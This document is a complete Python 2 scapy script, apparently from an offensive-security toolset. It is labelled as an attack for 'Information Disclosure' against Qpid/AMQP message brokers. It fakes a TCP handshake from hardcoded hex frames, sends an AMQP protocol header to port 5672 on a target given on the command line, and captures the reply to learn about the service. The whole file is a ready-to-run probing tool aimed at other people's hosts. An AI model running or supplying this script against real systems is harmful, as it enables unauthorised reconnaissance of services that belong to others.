#!/usr/bin/env python
# Author: William 'no1special' Coppola (SubINaclS)
# QPID Protocol Header Solicitor
from scapy.all import *
import os, sys
def getInfo():
 # vars
 getip = os.popen('ifconfig eth0 | grep "inet\ " | tr -s " " | cut -d" " -f3')
 ATTACKER=getip.read().strip("\n")
 s=ATTACKER # kali machine
 d=sys.argv[1] # QPID QPID
 sport=random.randint(30000,65535) # Random Port
 seq=random.randint(1000000000,4294967295) # Random Sequence
 def dosyn():
  # nc SYN payload ( Knock on Port )
  n1=Ether("\x00\x0c\x29\x70\xbb\xf8\x00\x0c\x29\xc2\xb3\x2b\x08\x00\x45\x00" \
  "\x00\x3c\xe3\xe2\x40\x00\x40\x06\xbf\xb0\xac\x10\x9f\x82\xac\x10" \
  "\x9f\x85\xed\x08\x16\x28\x7d\xbd\x0c\x34\x00\x00\x00\x00\xa0\x02" \
  "\x72\x10\xba\xd0\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x06\xfd" \
  "\xef\xd6\x00\x00\x00\x00\x01\x03\x03\x07") # NC Ethernet SYN
  n=n1[1] # Cut Ethernet Frame
  n[0].src = s # Set new Source IP
  n[0].dst = d # Set new Destination IP
  n[1].sport = sport # Set new source port
  n[1].dport = 5672 # Set QPID listening service port
  n[1].seq = seq # Set Random Sequence number
  del n[0].len # Remove packet length
  del n[0].chksum # Remove checksum in IP Frame
  del n[0].id # Remove ID in IP Frame
  del n[1].reserved # Remove reserved in TCP Frame
  del n[1].chksum # Remove checksum in TCP Frame
  p = IP(str(n)) # Reconstruct Packet
  return sr1(p) # Send and catch reply on wire
 m=dosyn() # capture syn reply
 # nc Ack payload ( Fire and Forget )
 n2=Ether("\x00\x0c\x29\x70\xbb\xf8\x00\x0c\x29\xc2\xb3\x2b\x08\x00\x45\x00" \
  "\x00\x34\xe3\xe3\x40\x00\x40\x06\xbf\xb7\xac\x10\x9f\x82\xac\x10" \
  "\x9f\x85\xed\x08\x16\x28\x7d\xbd\x0c\x35\x00\x53\xd0\x8e\x80\x10" \
  "\x00\xe5\xf7\xe4\x00\x00\x01\x01\x08\x0a\x06\xfd\xef\xd6\x00\x82" \
  "\x91\x6f") # NC Ethernet ACK
 n=n2[1] # Cut Ethernet Frame
 del n[0].len # Remove length in IP Frame
 del n[0].chksum # Remove checksum in IP Frame
 del n[0].id # Remove id in IP Frame
 del n[1].reserved # Remove reserved in TCP Frame
 del n[1].chksum # Remove checksum in TCP Frame
 n[0].id = m[0].id+1 # Set frame ID number
 n[1].dport = m[1].sport # Set source port
 n[1].sport = m[1].dport # Set destination port
 n[1].seq = m[1].ack # Set Sequence number
 n[1].ack = m[1].seq+1 # Set ACK number
 p = IP(str(n)) # Reconstruct Packet
 send(p) # Send reply on wire ( Fire and forget )
 # nc payload (AMQP Header Request)
 n3=Ether("\x00\x0c\x29\x70\xbb\xf8\x00\x0c\x29\xc2\xb3\x2b\x08\x00\x45\x00" \
  "\x00\x3d\xe3\xe4\x40\x00\x40\x06\xbf\xad\xac\x10\x9f\x82\xac\x10" \
  "\x9f\x85\xed\x08\x16\x28\x7d\xbd\x0c\x35\x00\x53\xd0\x8e\x80\x18" \
  "\x00\xe5\x5a\x2b\x00\x00\x01\x01\x08\x0a\x06\xfd\xef\xd6\x00\x82" \
  "\x91\x6f\x41\x4d\x51\x50\x01\x01\x00\x0a\x0a") # NC Ethernet PAYLOAD
 n=n3[1] # Cut Ethernet Frame
 del n[0].len # Remove length in IP Frame
 del n[0].chksum # Remove checksum in IP Frame
 del n[0].id # Remove id in IP Frame
 del n[1].reserved # Remove reserved in TCP Frame
 del n[1].chksum # Remove checksum in TCP Frame
 n[0].id = m[0].id+1 # Set frame ID number
 n[1].dport = m[1].sport # Set source port
 n[1].sport = m[1].dport # Set destination port
 n[1].seq = m[1].ack # Set Sequence number
 n[1].ack = m[1].seq+1 # Set ACK number
 p = IP(str(n)) # Reconstruct Packet
 Capture = sr1(p) # Send and catch reply on wire
 return Capture

print getInfo() # Launch the attack ( Information Disclosure )
